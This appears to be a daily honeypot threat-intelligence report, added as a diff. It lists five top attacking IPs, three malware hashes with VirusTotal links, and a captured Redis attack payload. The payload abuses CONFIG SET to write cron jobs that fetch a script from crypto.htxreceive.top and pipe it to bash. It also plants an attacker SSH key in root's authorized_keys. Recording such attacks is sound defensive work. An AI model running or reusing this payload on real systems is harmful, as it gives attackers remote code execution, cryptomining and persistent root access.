@@ -1,0 +1,28 @@
+Top 5 IPs for 15-08-2024 :
+
+31.220.84.210
+141.95.207.239
+170.64.139.223
+5.42.75.1
+181.48.99.155
+
+
+Malware Observed:
+
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed
+
+
+*1"$4"save"*4"$6"config"$3"set"$10"dbfilename"$9"backup.db"*4"$6"config"$3"set"$27"stop-writes-on-bgsave-error"$2"no"*4"$6"config"$3"set"$15"slave-read-only"$2"no"*1"$4"save"*1"$8"flushall"*4"$6"config"$3"set"$3"dir"$16"/var/spool/cron/"*4"$6"config"$3"set"$10"dbfilename"$4"root"*5"$3"set"$7"backup1"$78"\n\n\n*/2 * * * * curl -fsSL http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*5"$3"set"$7"backup1"$77"\n\n\n*/3 * * * * cd1 -fsSL http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*5"$3"set"$7"backup1"$79"\n\n\n*/4 * * * * wget -q -O- http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*5"$3"set"$7"backup1"$78"\n\n\n*/5 * * * * wd1 -q -O- http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*1"$4"save"*4"$6"config"$3"set"$3"dir"$24"/var/spool/cron/crontabs"*1"$4"save"*1"$8"flushall"*4"$6"config"$3"set"$3"dir"$11"/etx/cron.d"*4"$6"config"$3"set"$10"dbfilename"$3"zzh"*5"$3"set"$7"backup1"$83"\n\n\n*/2 * * * * root curl -fsSL http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*5"$3"set"$7"backup1"$82"\n\n\n*/3 * * * * root cd1 -fsSL http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*5"$3"set"$7"backup1"$84"\n\n\n*/4 * * * * root wget -q -O- http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*5"$3"set"$7"backup1"$83"\n\n\n*/5 * * * * root wd1 -q -O- http://crypto.htxreceive.top/s3f815/a/a.sh | bash \n\n"$2"ex"$1"5"*1"$4"save"*4"$6"config"$3"set"$3"dir"$5"/etc/"*4"$6"config"$3"set"$10"dbfilename"$7"crontab"*1"$4"save"*1"$8"flushall"*5"$3"set"$7"backup1"$218"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDUb5pEeJhagRZLDxE9YrxNidHyGXJGuAbV0okqs6/ZTQ7AdPddgbD00aPvdy2QNJGL4S07117NAayT/9vPmCgAFSY8zcIm8Vukw/HpvhgQfxxSrJaRl+Qf6ZkOAdKVY+SM0RpFz/YFK2XEaf9WvdsQ0LM3R4Jlj1bu1IEGHdGNGw==\n\n\n"$2"ex"$1"5"*4"$6"config"$3"set"$3"dir"$10"/root/.ssh"*4"$6"config"$3"set"$10"dbfilename"$15"authorized_keys"*1"$4"save"
